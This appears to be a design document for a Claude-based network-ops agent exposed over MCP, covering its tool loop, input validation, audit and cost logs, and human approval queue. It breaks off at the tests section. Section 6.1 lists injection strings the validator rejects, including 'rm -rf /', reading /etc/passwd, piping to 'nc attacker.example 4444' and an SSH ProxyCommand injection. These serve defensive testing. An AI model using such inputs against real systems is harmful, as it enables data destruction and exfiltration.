# clab-ai-mcp — Design Document

> **Audience:** A network engineer who hasn't worked with LLM tooling before. You know what GPT/Claude can do at a chat level but haven't built an agent that takes actions on infrastructure. This doc explains the Anthropic API, the Model Context Protocol (MCP), tool-use loops, structured outputs, audit trails, cost telemetry, and human-in-the-loop (HITL) approval — and how they compose into a safe network-ops agent.

---

## 1. What this repo is

An **LLM-driven network operations agent** built on the Anthropic Claude API. It can:

- Query BGP state on lab routers (via the telemetry stack, with SSH fallback)
- Look up ASN info on PeeringDB
- Validate prefixes against RPKI (Cloudflare API)
- Generate multi-vendor BGP peer configs from Jinja2 templates
- Query historical analytics from `clab-observability`'s ClickHouse via a parameterized allowlist
- Propose configuration changes through a file-based HITL approval queue

It exposes its tools two ways:

1. **`agent.py`** — a standalone CLI that runs Claude's tool-use loop end-to-end (`python agent.py "check BGP on leaf1"`)
2. **`mcp_server.py`** — a Model Context Protocol server that exposes the same tools to any MCP-compatible host (Claude Desktop, IDE plugins, custom hosts)

Crucially, the agent has security defenses built in: every tool input is validated against an allowlist before reaching a shell; every tool call is audited; every Claude turn's token usage and dollar cost is logged; runaway loops are bounded.

---

## 2. Mental model — how an LLM "uses tools"

Without tools, an LLM is a text-completion engine. You give it a prompt, it gives you text.

With tools, you tell the model: "Here are some functions you can call. When you want to call one, output a tool-use block instead of text. I'll run the function and give you the result; you continue from there."

```
┌────────────────────┐
│ User: "Check BGP   │
│ neighbors on       │
│ leaf1"             │
└──────────┬─────────┘
           │
           ▼
┌────────────────────────────────────┐
│ agent.py builds messages list:     │
│   [{role: user, content: query}]   │
└──────────┬─────────────────────────┘
           │
           ▼
┌────────────────────────────────────┐
│ client.messages.create(            │
│   model="claude-sonnet-4-6",       │
│   tools=[get_bgp_summary, ...],    │
│   messages=[...]                   │
│ )                                  │
└──────────┬─────────────────────────┘
           │
           ▼
   Claude responds:
   {role: assistant, content: [
     {type: tool_use, name: "get_bgp_summary", id: "tu_01abc", input: {host: "leaf1"}}
   ]}
           │
           ▼
┌────────────────────────────────────┐
│ agent.py: stop_reason="tool_use"   │
│ → run tool_handler("get_bgp_       │
│       summary", {"host": "leaf1"}) │
│ → returns "Peer Established..."    │
└──────────┬─────────────────────────┘
           │
           ▼
   agent.py appends to messages:
   [
     ...,
     {role: assistant, content: [tool_use block]},
     {role: user, content: [
       {type: tool_result, tool_use_id: "tu_01abc",
        content: "Peer Established..."}
     ]}
   ]
           │
           ▼
   Loop: send messages back to Claude
           │
           ▼
   Claude responds with final text:
   {role: assistant, content: [
     {type: text, text: "leaf1 has 2 peers, both Established."}
   ]}
           │
           ▼
   stop_reason="end_turn" → exit loop
```

The agent loop is just **alternating turns between Claude and the local Python**. Each Claude turn either:
- Asks for a tool call (`stop_reason="tool_use"`) → run it, append result, send again
- Returns final text (`stop_reason="end_turn"`) → loop exits

Everything interesting in this repo is **what happens inside `tool_handler`** — that's where validation, audit logging, cost telemetry, and HITL gates live.

---

## 3. Tools used — what they are and why

### 3.1 Anthropic Claude API (`anthropic` SDK)

**What it is:** Anthropic's Python SDK (`pip install anthropic`). Wraps HTTPS calls to `api.anthropic.com`.

**Why we use it:** The Claude family of models has strong tool-use support, returns structured `tool_use` blocks reliably, and supports message-level conversation state.

**Model:** `claude-sonnet-4-6` — the right balance of capability, latency, and cost for an ops agent. Sonnet handles multi-step reasoning well, doesn't need Opus's depth, and is cheaper.

**Authentication:** `ANTHROPIC_API_KEY` env var. The SDK reads it automatically.

**Cost telemetry:** Every `messages.create` response includes a `usage` object with `input_tokens`, `output_tokens`, `cache_read_input_tokens`. We multiply by current rates ($3/M input, $15/M output for Sonnet 4.6) → USD per turn, logged.

### 3.2 Model Context Protocol (MCP)

**What it is:** An open protocol (originally from Anthropic, now being adopted by OpenAI and others) for exposing tools to LLM hosts. Think of it as "USB for AI applications" — a uniform interface so any tool-server can plug into any host.

**Three transport options:**
- **stdio** — child process via stdin/stdout (Claude Desktop uses this)
- **HTTP** — REST-style endpoint
- **WebSocket** — bidirectional streaming

We use **stdio** because it's the simplest and what Claude Desktop expects.

**Why MCP and not LangChain:** See [ADR 0001](adr/0001-mcp-not-langchain.md). MCP is **portable** — the same `mcp_server.py` we ship works in Claude Desktop, in any future MCP-compatible IDE plugin, or in a custom host. A LangChain agent stays inside a Python process.

### 3.3 FastMCP (`mcp` Python package)

**What it is:** A Python framework that lets you define MCP tools using decorators:

```python
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("network-ops-agent")

@mcp.tool()
def get_bgp_summary(host: str) -> str:
    """Get BGP neighbor summary from a router."""
    return _bgp_summary(host)
```

FastMCP handles the protocol-level message exchange (initialize, list-tools, call-tool), schema generation from type hints, and JSON-RPC marshaling. You write the tool functions; the framework wires them.

### 3.4 Pydantic (`tools/schemas.py`)

**What it is:** Python's premier data-validation library. You declare a class with typed fields; Pydantic generates a JSON Schema and validates inputs/outputs.

**Why we use it:** Tools should return **structured** data, not free-form strings. Pydantic gives us:
- Type-safe tool outputs
- Auto-generated JSON Schema for the LLM to chain calls reliably
- Validation at the boundary (the LLM can't fabricate a field that isn't in the schema)

Example:
```python
class BGPPeerState(BaseModel):
    peer_ip: str
    peer_asn: int
    state: Literal["Established", "Idle", "Active", "Connect", "OpenSent", "OpenConfirm"]
    uptime_seconds: Optional[int] = None
    prefixes_received: Optional[int] = None
```

The `Literal[...]` constrains state to exactly those values — the LLM (or tool) can't return "Up" or "Down" by accident.

We also have a `Citation` model so the agent can ground its claims:
```python
class Citation(BaseModel):
    tool_use_id: str        # which tool_use block produced this
    tool_name: str
    excerpt: str = Field(max_length=500)
```

### 3.5 Netmiko (lazy-imported)

**What it is:** Same Python SSH library used in `clab-automation`. Wraps SSH for network device interaction.

**Why we use it (as a fallback):** When the telemetry stack has no recent data for a host, `tools/bgp_tools.py` falls back to SSH. The primary path is the ClickHouse query (Section 3.10).

**Lazy import:** Imported only inside the function that needs it (`tools/bgp_tools.py:_connect`), so tests without `netmiko` installed don't fail.

### 3.6 requests

**What it is:** The Python HTTP library. Used for PeeringDB and Cloudflare RPKI API calls.

**Why we use it:** Simple, well-known, sufficient for two REST endpoints.

### 3.7 Jinja2

**What it is:** Same templating engine as `clab-automation`. Used for the `generate_bgp_config` tool — render a BGP peer config from inputs.

**Strict mode:** `Environment(undefined=StrictUndefined)`. If the LLM passes a field the template doesn't expect, it fails loud.

### 3.8 pytest

**What it is:** The test framework. Three test files:

- `tests/test_injection.py` — 23 adversarial inputs to `validate_host` and `validate_prefix`. Confirms shell metacharacter injection, SSH option injection, path traversal, null bytes, CRLF, Unicode lookalikes are all rejected.
- `tests/test_agent.py` — basic tool-handler dispatch tests + Pydantic schema checks
- `tests/test_eval.py` — 8 scenario tests. Given a tool call, the dispatch should produce a result containing expected keywords. This is the regression suite for *agent reasoning*, not just code correctness.

### 3.9 MOCK_MODE

**What it is:** An env var (`MOCK_MODE=true`) that flips every tool from "live external call" to "read fixture from `mocks/`".

**Why it exists:**
- Tests run offline (no Anthropic API, no PeeringDB, no SSH)
- Demos work without spinning up the full lab
- CI is deterministic (no flaky network)

Fixtures in `mocks/`:
- `peeringdb_asn13335.json` — realistic Cloudflare PeeringDB response
- `rpki_valid.json` — RPKI valid response
- `bgp_summary.txt` — FRR `show bgp summary` output
- `clickhouse_*.json` — 4 fixture responses (one per named query in the allowlist)

### 3.10 Cross-project: `query_clickhouse`

**What it is:** A tool that queries `clab-observability`'s ClickHouse via a **parameterized allowlist of named queries**. The LLM doesn't write SQL; it picks from `prefix_history`, `top_flapping_prefixes`, `peer_route_counts`, `peer_events_for_host` and supplies typed parameters.

**Why named allowlist instead of arbitrary SQL:** Arbitrary SQL is a **prompt injection vector with high blast radius**. The LLM could be tricked into `DROP TABLE bgp_routes` or `SELECT * FROM users; --`. Named queries are bounded: the SQL is in our code, the LLM only picks the name and supplies typed parameters.

This is the security-critical architectural decision that the independent reviewer flagged as the single most impressive thing in the portfolio.

### 3.11 Audit log (`tools/audit.py`)

**What it is:** Append-only JSONL writer. Every tool invocation produces one record:

```json
{
  "id": "uuid",
  "ts": "2026-05-16T14:23:11Z",
  "session_id": "uuid",
  "tool": "get_bgp_summary",
  "input": {"host": "leaf1"},
  "result_preview": "...",
  "duration_ms": 142.3,
  "decision": "auto"
}
```

**Why JSONL:** Append-only, line-delimited, friendly to Splunk/Vector/`jq`. SIEM-exportable for compliance.

**Why every tool call gets a record:** Auditability. Weeks later you can ask "what did the AI do and why?" — the audit trail is the only honest answer.

### 3.12 Cost telemetry (`tools/telemetry.py`)

**What it is:** Per-Claude-turn token + USD logger. Reads `response.usage`, computes USD using current Anthropic rates:

```python
PRICE_PER_MTOK_INPUT = 3.00   # $/M input tokens
PRICE_PER_MTOK_OUTPUT = 15.00 # $/M output tokens
# Cache reads bill at 10% of input rate
```

Writes to `telemetry.jsonl`. Lets you aggregate cost per session, per task, per day.

**Why per-turn instead of per-task:** Per-turn data lets you analyze prompt efficiency. If one turn is 50% of the cost, you know which interaction to optimize.

### 3.13 HITL approval (`tools/hitl.py`)

**What it is:** A file-based approval queue. The agent calls `propose_change(diff=..., target=..., impact=...)` which writes `approvals/<uuid>.json` with `status: "pending"`. A separate process (operator, or another agent) approves/denies by editing the file.

**Why HITL:** For *write* operations (deploy a config change), you want a human in the loop. LLMs hallucinate. Multi-step reasoning chains compound errors. The cost of a bad config push to a production fabric is much higher than the cost of operator latency.

**Why file-based and not Slack/PagerDuty:** Lab simplicity. The function signature (`propose_change` / `await_decision` / `approve` / `deny`) is replaceable: swap the storage backend and the agent doesn't change.

**Demo script:** `scripts/hitl_demo.py` — agent generates a new-leaf config, proposes it, polls for approval, then either "deploys" or reports denial.

### 3.14 TTL cache (`tools/cache.py`)

**What it is:** A simple TTL cache decorator. Functions wrapped with `@ttl_cache(seconds=3600)` are memoized for 1 hour keyed on their arguments.

**Why:** PeeringDB rate-limits aggressively. If the LLM asks "who is AS 13335" three times in a session, we only want to hit PeeringDB once.

```python
@ttl_cache(seconds=3600)
def peeringdb_lookup(asn: int) -> dict:
    ...
```

In-memory only — process-scoped. Production would use Redis with shared TTL across agent replicas.

### 3.15 Hostname allowlist (`tools/validation.py`)

**What it is:** Two functions:
- `validate_host(host: str)` — rejects unless host is in `LAB_NODES = {"spine1", "spine2", "leaf1", "leaf2"}` or a plain IPv4 dotted-quad
- `validate_prefix(prefix: str)` — rejects unless matches `^[\d./]+$`

**Why an allowlist and not a sandbox:** See [ADR 0002](adr/0002-allowlist-not-sandbox.md). The agent doesn't have arbitrary shell access — only enumerated tools with typed parameters. The attack surface is **parameter validation**, not shell execution. A hostname allowlist is the minimum viable security control at the relevant boundary.

**Defense in depth:**
1. MCP-level: tool parameter schemas typed via Pydantic
2. Server-level: `validate_host()` regex + allowlist
3. Subprocess-level: list-arg form (no `shell=True`), no shell metachar interpretation
4. Test-level: `tests/test_injection.py` runs 23 adversarial inputs against the validator

### 3.16 Runaway protection (`MAX_ITERATIONS=20`)

**What it is:** The agent loop is capped at 20 iterations.

**Why:** An LLM can in principle loop forever calling tools. With token costs, that's a DoS vector against your Anthropic credit. The cap forces termination.

```python
iterations = 0
while response.stop_reason == "tool_use":
    iterations += 1
    if iterations > MAX_ITERATIONS:
        print(f"⚠ aborting: exceeded MAX_ITERATIONS={MAX_ITERATIONS}")
        break
    ...
```

### 3.17 obs_sink (cross-repo, copied from `clab-automation`)

**What it is:** Same `obs_sink.py` as the automation repo — emits structured events to JSONL + optional Elasticsearch.

**Why duplicated:** Avoiding cross-repo Python imports. The agent and the automation pipeline both write to the same event stream so the observability tier sees one unified view.

---

## 4. Repository structure

```
clab-ai-mcp/
├── .github/workflows/
│   └── ci.yml                      # Ruff + pytest with MOCK_MODE=true
├── agent.py                        # Standalone CLI agent
├── airflow/                        # (removed — moved to clab-observability)
├── docs/
│   ├── DESIGN.md                   # THIS FILE
│   ├── THREAT_MODEL.md             # STRIDE analysis
│   └── adr/
│       ├── 0001-mcp-not-langchain.md
│       ├── 0002-allowlist-not-sandbox.md
│       └── 0003-mock-mode-and-audit.md
├── mcp_server.py                   # MCP server (FastMCP) exposing same tools
├── mocks/
│   ├── bgp_summary.txt
│   ├── peeringdb_asn13335.json
│   ├── rpki_valid.json
│   ├── clickhouse_peer_events_for_host.json
│   ├── clickhouse_peer_route_counts.json
│   ├── clickhouse_prefix_history.json
│   └── clickhouse_top_flapping_prefixes.json
├── pyproject.toml                  # Dependencies (anthropic, mcp, netmiko, jinja2, etc.)
├── scripts/
│   └── hitl_demo.py                # End-to-end demo: propose → approve → deploy
├── templates/
│   ├── arista_bgp_peer.j2
│   ├── frr_bgp_peer.j2
│   └── juniper_bgp_peer.j2
├── tests/
│   ├── conftest.py                 # Sets MOCK_MODE=true for all tests
│   ├── test_agent.py               # Tool-handler dispatch
│   ├── test_eval.py                # 8 evaluation scenarios
│   └── test_injection.py           # 23 adversarial inputs to validate_host
├── tools/
│   ├── __init__.py
│   ├── audit.py                    # JSONL audit log
│   ├── bgp_tools.py                # ClickHouse-first, SSH-fallback BGP queries
│   ├── cache.py                    # TTL cache decorator
│   ├── clickhouse_tool.py          # Cross-project query allowlist
│   ├── config_tools.py             # Jinja2 render with StrictUndefined
│   ├── hitl.py                     # propose / await / approve / deny
│   ├── obs_sink.py                 # Shared event sink (JSONL + optional ES)
│   ├── peeringdb_tools.py          # PeeringDB API (cached)
│   ├── rpki_tools.py               # Cloudflare RPKI API
│   ├── schemas.py                  # Pydantic models for structured outputs
│   ├── telemetry.py                # Per-Claude-turn token + USD logger
│   └── validation.py               # validate_host / validate_prefix
├── topology/
│   └── lab.clab.yml                # 3-node FRR target lab
├── .env.example                    # ANTHROPIC_API_KEY + MOCK_MODE
├── .gitattributes
├── .gitignore                      # Excludes audit.jsonl, telemetry.jsonl, approvals/
├── .gitlab-ci.yml                  # Legacy
├── .pre-commit-config.yaml
├── LICENSE                         # MIT
├── README.md
└── SECURITY.md
```

### 4.1 What each major file does

| File | Role |
|------|------|
| `agent.py` | Standalone CLI tool. Runs `client.messages.create` loop. Manages audit + cost telemetry. |
| `mcp_server.py` | MCP server. Same tools as `agent.py` but exposed via FastMCP/stdio. |
| `tools/bgp_tools.py` | The telemetry-first BGP state path. ClickHouse query → SSH fallback. |
| `tools/clickhouse_tool.py` | The cross-project query allowlist. **Not arbitrary SQL.** |
| `tools/validation.py` | The security boundary. All LLM-supplied strings go through here. |
| `tools/audit.py` | Every tool call → one JSONL record. |
| `tools/telemetry.py` | Every Claude turn → token + cost record. |
| `tools/hitl.py` | Approval queue primitives for write operations. |
| `mocks/` | Fixture data for `MOCK_MODE=true`. |
| `tests/test_injection.py` | 23 adversarial inputs all rejected. |
| `tests/test_eval.py` | 8 scenarios — does the agent reason correctly? |

---

## 5. Walking through `agent.py`

### 5.1 Setup

```python
import json, os, sys, time, uuid
from tools.audit import log_tool_call

MODEL = "claude-sonnet-4-6"
MAX_TOKENS = 1024
MAX_ITERATIONS = 20
SESSION_ID = os.environ.setdefault("AGENT_SESSION_ID", str(uuid.uuid4()))


def _get_client():
    """Lazy-import Anthropic so unit tests don't require the SDK installed."""
    from anthropic import Anthropic
    return Anthropic()
```

`SESSION_ID` — UUID per agent session. Every tool call and every Claude turn gets this in its audit record, so you can reconstruct a session.

Lazy-importing `anthropic` keeps tests fast and avoids requiring the SDK on contributors who only want to lint/test.

### 5.2 Tool declarations

```python
tools = [
    {
        "name": "get_bgp_summary",
        "description": "Get BGP neighbor summary from a router (show bgp summary).",
        "input_schema": {
            "type": "object",
            "properties": {
                "host": {"type": "string", "description": "Lab node name (spine1/leaf1/leaf2) or IPv4"}
            },
            "required": ["host"],
        },
    },
    {
        "name": "query_clickhouse",
        "description": "Query clab-observability's ClickHouse for BGP analytics. "
                       "Named queries: prefix_history, top_flapping_prefixes, "
                       "peer_route_counts, peer_events_for_host.",
        "input_schema": {
            "type": "object",
            "properties": {
                "query_name": {
                    "type": "string",
                    "enum": ["prefix_history", "top_flapping_prefixes", "peer_route_counts"],
                },
                "prefix": {"type": "string"},
                "hours": {"type": "integer"},
                "minutes": {"type": "integer"},
                "limit": {"type": "integer"},
            },
            "required": ["query_name"],
        },
    },
    # ... 5 more tools
]
```

**JSON Schema for every tool.** Claude uses this to know what arguments to supply. The `enum` constraint on `query_name` is the security boundary — Claude *cannot* invent a new query name; it must pick from the four we expose.

### 5.3 The `tool_handler` dispatcher

```python
def tool_handler(tool_name, tool_input):
    """Dispatch a single tool call. Honors MOCK_MODE; appends an audit record."""
    started = time.time()
    result: str
    try:
        from tools.bgp_tools import get_bgp_summary, get_bgp_routes, get_evpn_vni
        from tools.peeringdb_tools import peeringdb_lookup
        from tools.rpki_tools import check_rpki
        from tools.config_tools import generate_bgp_config
        from tools.clickhouse_tool import query_clickhouse

        if tool_name == "get_bgp_summary":
            result = get_bgp_summary(tool_input["host"])
        elif tool_name == "get_bgp_routes":
            result = get_bgp_routes(tool_input["host"], tool_input.get("prefix", ""))
        elif tool_name == "get_evpn_vni":
            result = get_evpn_vni(tool_input["host"])
        elif tool_name == "peeringdb_lookup":
            result = json.dumps(peeringdb_lookup(tool_input["asn"]), indent=2)
        elif tool_name == "check_rpki":
            result = json.dumps(check_rpki(tool_input["prefix"], tool_input["origin_as"]), indent=2)
        elif tool_name == "generate_bgp_config":
            result = generate_bgp_config(...)
        elif tool_name == "query_clickhouse":
            qn = tool_input["query_name"]
            params = {k: v for k, v in tool_input.items() if k != "query_name"}
            result = json.dumps(query_clickhouse(qn, **params), indent=2)
        else:
            result = f"Tool not found: {tool_name}"
    except Exception as e:
        result = f"Tool error ({tool_name}): {e}"

    duration_ms = (time.time() - started) * 1000
    log_tool_call(tool_name, tool_input, result, duration_ms=duration_ms, session_id=SESSION_ID)
    return result
```

The dispatcher is a big `if/elif` chain — explicit, auditable, no `eval` or dynamic dispatch. Every tool call:
1. Lazy-imports the tool module
2. Dispatches based on `tool_name` (string match)
3. Times the call
4. Wraps in try/except so a tool exception becomes a return value (Claude can see "Tool error: X" and recover)
5. Logs to audit before returning

### 5.4 The agent loop

```python
def run_agent(query):
    from tools.telemetry import record_usage

    print(f"\n>>> {query}\n")
    client = _get_client()
    messages = [{"role": "user", "content": query}]

    response = client.messages.create(
        model=MODEL, max_tokens=MAX_TOKENS, tools=tools, messages=messages
    )
    record_usage(response, session_id=SESSION_ID, query=query)

    iterations = 0
    while response.stop_reason == "tool_use":
        iterations += 1
        if iterations > MAX_ITERATIONS:
            print(f"⚠ aborting: exceeded MAX_ITERATIONS={MAX_ITERATIONS}")
            break

        tool_uses = [b for b in response.content if b.type == "tool_use"]
        if not tool_uses:
            break

        tool_results = []
        for tu in tool_uses:
            result = tool_handler(tu.name, tu.input)
            tool_results.append({
                "type": "tool_result", "tool_use_id": tu.id, "content": result
            })

        messages.append({"role": "assistant", "content": response.content})
        messages.append({"role": "user", "content": tool_results})

        response = client.messages.create(
            model=MODEL, max_tokens=MAX_TOKENS, tools=tools, messages=messages
        )
        record_usage(response, session_id=SESSION_ID, query=query)

    final_text = [b.text for b in response.content if hasattr(b, "text")]
    if final_text:
        print(final_text[0])
```

Walk through one iteration:

1. **First request to Claude.** Send `messages = [{role: user, content: "..."}]` along with the `tools` list. Claude responds with either text (done) or `tool_use` blocks (call these functions).

2. **Per-turn cost telemetry** — `record_usage(response, ...)` writes `telemetry.jsonl` line.

3. **Iteration cap check** — bail if we've looped 20 times.

4. **Collect tool_use blocks.** Claude can request *multiple* tool calls in one turn. Iterate them all.

5. **For each tool_use, call `tool_handler`** → get the result string → wrap in a `tool_result` block with the matching `tool_use_id`. Order matters: every `tool_use_id` Claude sent must have exactly one `tool_result` reply.

6. **Append to messages.** The conversation now has:
   - Original user message
   - Assistant turn with tool_use blocks
   - User turn with tool_result blocks

7. **Send back to Claude.** Continue the loop. Claude sees the tool results and decides whether to call more tools or produce final text.

8. **`stop_reason != "tool_use"`** → exit loop, print final text.

This is the entire agent. Maybe 40 lines. The complexity is in the **tools** (Section 6).

---

## 6. Walking through the tools

### 6.1 `tools/validation.py` — the security boundary

```python
import re

LAB_NODES = frozenset({"spine1", "spine2", "leaf1", "leaf2"})
_IPV4_RE = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
_PREFIX_RE = re.compile(r"^[0-9./]+$")


def validate_host(host: str) -> str:
    if not isinstance(host, str) or not host.strip():
        raise ValueError(f"Untrusted host: {host!r}. Empty / wrong type.")
    if host in LAB_NODES:
        return host
    if _IPV4_RE.match(host):
        if all(0 <= int(o) <= 255 for o in host.split(".")):
            return host
    raise ValueError(f"Untrusted host: {host!r}. Must be a lab node name or IPv4 address.")


def validate_prefix(prefix: str) -> str:
    if not prefix:
        return prefix
    if not _PREFIX_RE.match(prefix):
        raise ValueError(f"Invalid prefix format: {prefix!r}")
    return prefix
```

**Three layers of defense:**

1. **Type check** — must be a non-empty string
2. **Allowlist check** — must be a known lab node name
3. **Format check** — if not in allowlist, must be a plain IPv4

If none match → `ValueError`. The exception propagates up through `tool_handler` and becomes "Tool error: Untrusted host: ..." which Claude sees and recovers from.

**What this defends against** (from `tests/test_injection.py`):
- `"leaf1; rm -rf /"` — shell metachar injection
- `"leaf1 && cat /etc/passwd"` — command chain
- `"leaf1 | nc attacker.example 4444"` — pipe to network
- `"leaf1 -o ProxyCommand=evil"` — SSH option injection
- `"../../etc/passwd"` — path traversal
- `"leaf1\x00rm"` — null byte injection
- `"leaf1\r\nrm -rf /"` — CRLF injection
- `"lеaf1"` — Cyrillic 'e' Unicode lookalike
- `"999.999.999.999"` — invalid IPv4 octets

All rejected.

### 6.2 `tools/bgp_tools.py` — telemetry-first BGP queries

```python
from .clickhouse_tool import query_clickhouse
from .validation import validate_host, validate_prefix

TELEMETRY_FRESHNESS_MINUTES = 5


def get_bgp_summary(host: str) -> str:
    host = validate_host(host)  # raises ValueError on injection

    if MOCK_MODE:
        return (MOCK_DIR / "bgp_summary.txt").read_text()

    # Path A: ClickHouse (preferred — agent consumes the platform's telemetry)
    try:
        result = query_clickhouse(
            "peer_events_for_host",
            host=host,
            minutes=TELEMETRY_FRESHNESS_MINUTES,
        )
        events = result.get("data") or result.get("rows") or []
        if events:
            return _format_peer_events_as_summary(host, events)
    except Exception as e:
        ssh_reason = f"telemetry query failed: {e}"
    else:
        ssh_reason = "no fresh telemetry data; pipeline may be stale"

    # Path B: SSH fallback
    if MOCK_MODE:
        return f"(SSH fallback would run here — {ssh_reason})"
    try:
        with _connect(host) as conn:
            output = conn.send_command("vtysh -c 'show bgp summary'")
            return f"[ssh fallback — {ssh_reason}]\n{output}"
    except Exception as e:
        return f"Error: telemetry empty AND ssh failed ({e})"
```

**The architectural decision the architect-level review fixed:** Earlier this function went straight to SSH (`vtysh -c "show bgp summary"`). That made the AI agent a *parallel* observer of the fabric, bypassing the entire observability stack we built.

Now: **try ClickHouse first**, fall back to SSH only when:
- Telemetry query fails (ClickHouse unreachable)
- No fresh data in the last 5 minutes (pipeline is stale → SSH is more authoritative)

The agent is now a **consumer of the platform's telemetry**, the way a senior operator would actually answer "what's BGP state on leaf1" — by querying the BMP feed in ClickHouse, not by SSHing into the box.

### 6.3 `tools/clickhouse_tool.py` — parameterized allowlist

```python
QUERIES = {
    "prefix_history": """
        SELECT timestamp, action, peer_ip, peer_asn
        FROM bgp_routes
        WHERE prefix = {prefix:String}
          AND timestamp >= now() - INTERVAL {hours:UInt32} HOUR
        ORDER BY timestamp DESC
        LIMIT 100
        FORMAT JSON
    """,
    "top_flapping_prefixes": """
        SELECT prefix, origin_as, count() AS state_changes
        FROM bgp_routes
        WHERE timestamp >= now() - INTERVAL {hours:UInt32} HOUR
        GROUP BY prefix, origin_as
        ORDER BY state_changes DESC
        LIMIT {limit:UInt32}
        FORMAT JSON
    """,
    "peer_route_counts": "...",
    "peer_events_for_host": "...",
}


def query_clickhouse(query_name: str, **params) -> dict:
    if query_name not in QUERIES:
        return {"error": f"Unknown query {query_name!r}. Allowed: {list(QUERIES)}"}

    if MOCK_MODE:
        mock_file = MOCK_DIR / f"clickhouse_{query_name}.json"
        if mock_file.exists():
            return json.loads(mock_file.read_text())

    query = QUERIES[query_name]
    param_query = {f"param_{k}": v for k, v in params.items()}
    resp = requests.post(CLICKHOUSE_URL, data=query, params=param_query, timeout=30)
    resp.raise_for_status()
    return resp.json()
```

**The security pattern**:
- LLM picks a `query_name` from the enum-constrained list
- LLM supplies typed parameters (`prefix: String`, `hours: UInt32`)
- We send the query *we wrote* with the parameters bound via ClickHouse's `{param:Type}` syntax (parameterized queries, no string interpolation)
- ClickHouse's `?param_<name>=` query string passes the values as bound parameters

The LLM **cannot** inject SQL. It can only pick from queries we defined.

### 6.4 `tools/audit.py` — the audit trail

```python
import json, os, time, uuid
from pathlib import Path

AUDIT_PATH = Path(os.getenv("AUDIT_LOG", "audit.jsonl"))


def log_tool_call(tool_name, tool_input, result, *, duration_ms=None,
                  session_id=None, decision="auto"):
    record = {
        "id": str(uuid.uuid4()),
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "session_id": session_id or os.getenv("AGENT_SESSION_ID", "unknown"),
        "tool": tool_name,
        "input": tool_input,
        "result_preview": result[:4096] if isinstance(result, str) else str(result)[:4096],
        "duration_ms": duration_ms,
        "decision": decision,
    }
    AUDIT_PATH.parent.mkdir(parents=True, exist_ok=True)
    with AUDIT_PATH.open("a") as f:
        f.write(json.dumps(record) + "\n")
    return record["id"]
```

- **Append-only** (`"a"` mode) — never overwrites
- **Truncate result** to 4096 chars — bounded record size
- **`decision` field** — for HITL gates: `auto | approved | denied | rejected`

In production this stream goes through Vector → S3 with Object Lock (tamper-resistance) for compliance.

### 6.5 `tools/telemetry.py` — cost telemetry

```python
PRICE_PER_MTOK_INPUT = 3.00
PRICE_PER_MTOK_OUTPUT = 15.00


def record_usage(response, *, session_id=None, query=""):
    usage = response.usage
    input_tokens = usage.input_tokens
    output_tokens = usage.output_tokens
    cache_read = getattr(usage, "cache_read_input_tokens", 0) or 0

    chargeable_input = input_tokens - cache_read
    cost_usd = (
        (chargeable_input / 1_000_000) * PRICE_PER_MTOK_INPUT
        + (cache_read / 1_000_000) * PRICE_PER_MTOK_INPUT * 0.10
        + (output_tokens / 1_000_000) * PRICE_PER_MTOK_OUTPUT
    )

    record = {
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "session_id": session_id,
        "query_preview": query[:200],
        "model": getattr(response, "model", "claude-sonnet-4-6"),
        "input_tokens": input_tokens,
        "output_tokens": output_tokens,
        "cache_read_tokens": cache_read,
        "cost_usd": round(cost_usd, 6),
        "stop_reason": getattr(response, "stop_reason", None),
    }
    with TELEMETRY_PATH.open("a") as f:
        f.write(json.dumps(record) + "\n")
```

Per-turn record. Aggregate with `jq`:

```bash
# Total cost for a session
jq -s 'map(.cost_usd) | add' telemetry.jsonl
```

### 6.6 `tools/hitl.py` — propose / approve / deny

```python
APPROVALS_DIR = Path(os.getenv("APPROVALS_DIR", "approvals"))
AUTO_APPROVE = os.getenv("HITL_AUTO_APPROVE", "false").lower() == "true"


def propose_change(*, summary, diff, target, impact="unknown", proposed_by="agent"):
    record = {
        "id": str(uuid.uuid4()),
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "status": "pending",
        "summary": summary,
        "target": target,
        "impact": impact,
        "proposed_by": proposed_by,
        "diff": diff,
    }
    APPROVALS_DIR.mkdir(parents=True, exist_ok=True)
    (APPROVALS_DIR / f"{record['id']}.json").write_text(json.dumps(record, indent=2))
    return record


def await_decision(approval_id, *, timeout_seconds=0):
    if AUTO_APPROVE:
        _set_status(approval_id, "approved", "auto-approved via HITL_AUTO_APPROVE")
        return "approved"

    path = APPROVALS_DIR / f"{approval_id}.json"
    if timeout_seconds == 0:
        return json.loads(path.read_text())["status"]

    deadline = time.time() + timeout_seconds
    while time.time() < deadline:
        record = json.loads(path.read_text())
        if record["status"] != "pending":
            return record["status"]
        time.sleep(2)
    return "timeout"


def approve(approval_id, *, reviewer, note=""):
    return _set_status(approval_id, "approved", note, reviewer=reviewer)


def deny(approval_id, *, reviewer, note=""):
    return _set_status(approval_id, "denied", note, reviewer=reviewer)
```

**The interface is replaceable.** Same functions, swap the storage:
- Lab: filesystem (this implementation)
- Production: ServiceNow ticket API, Slack interactive message, PagerDuty change-event, etc.

The agent code doesn't care; it just calls `propose_change()` and waits.

---

## 7. The MCP server

`mcp_server.py` is the same set of tools exposed via FastMCP instead of a CLI loop:

```python
from mcp.server.fastmcp import FastMCP
from tools.bgp_tools import get_bgp_summary as _bgp_summary
from tools.validation import validate_host as _validate_host

mcp = FastMCP("network-ops-agent")


@mcp.tool()
def get_bgp_summary(host: str) -> str:
    """Get BGP neighbor summary from a router via Netmiko SSH."""
    try:
        return _bgp_summary(_validate_host(host))
    except Exception as e:
        return f"Error: {e}"


@mcp.tool()
def query_clickhouse(query_name: str, **params) -> str:
    """Query clab-observability's ClickHouse..."""
    try:
        return json.dumps(_clickhouse(query_name, **params), indent=2)
    except Exception as e:
        return f"Error: {e}"


if __name__ == "__main__":
    mcp.run()
```

**Same tool implementations, different transport.** FastMCP handles the JSON-RPC initialize/list-tools/call-tool protocol over stdin/stdout.

### 7.1 Wiring into Claude Desktop

Claude Desktop reads `~/Library/Application Support/Claude/claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "network-ops": {
      "command": "python",
      "args": ["/Users/Pradep/Documents/.../clab-ai-mcp/mcp_server.py"]
    }
  }
}
```

Claude Desktop spawns `python mcp_server.py` as a child process and communicates via stdin/stdout. Now the desktop app has access to all 7 tools — same as `agent.py`.

---

## 8. Tests — what they verify

### 8.1 `tests/test_injection.py` — security

```python
